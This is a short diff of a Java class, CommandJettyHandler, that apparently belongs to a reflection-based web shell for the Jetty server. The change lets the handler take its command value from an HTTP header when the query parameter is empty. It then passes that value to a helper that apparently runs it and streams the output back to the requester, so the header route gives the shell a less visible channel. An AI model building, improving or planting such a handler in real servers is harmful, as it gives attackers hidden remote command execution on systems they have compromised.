@@ -33,8 +33,12 @@ public class CommandJettyHandler {
             response = args[1];
         }
         try {
-            String param = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
-            if (param != null) {
+            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
+            if (p == null || p.isEmpty()) {
+                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 byte[] buf = new byte[8192];
